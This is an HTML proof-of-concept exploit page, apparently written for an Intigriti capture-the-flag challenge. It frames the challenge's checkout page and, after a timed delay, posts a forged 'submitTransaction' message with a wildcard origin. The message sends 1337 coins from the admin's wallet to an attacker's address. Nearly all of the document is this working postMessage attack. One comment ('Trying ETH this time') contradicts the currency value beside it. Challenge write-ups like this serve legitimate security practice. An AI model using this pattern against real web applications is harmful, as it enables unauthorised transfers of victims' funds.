<!DOCTYPE html>
<html lang="en">
<head>
    <title>PostMessage Exploit PoC</title>
</head>
<body>
    <h1>"Following the trail of coins..."</h1>
    <p>Waiting for Admin's wallet to load...</p>
    
    <iframe id="target" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=1" width="500" height="500"></iframe>

    <script>
        window.onload = function() {
            var targetFrame = document.getElementById('target').contentWindow;

            var maliciousPayload = {
                type: 'submitTransaction',
                transaction: {
                    currency: '1337COIN', // Trying ETH this time
                    amount: 1337,
                    toAddress: '10970063d33e32396bb80753a2b902d568' // Your wallet
                }
            };

            // WAIT 4 SECONDS before sending the payload. 
            // This gives the API plenty of time to load the Admin's wallet 
            // and avoids triggering the blocking alert().
            setTimeout(() => {
                targetFrame.postMessage(maliciousPayload, '*');
                console.log("Payload sent!");
            }, 4000); 
        };
    </script>
</body>
</html>
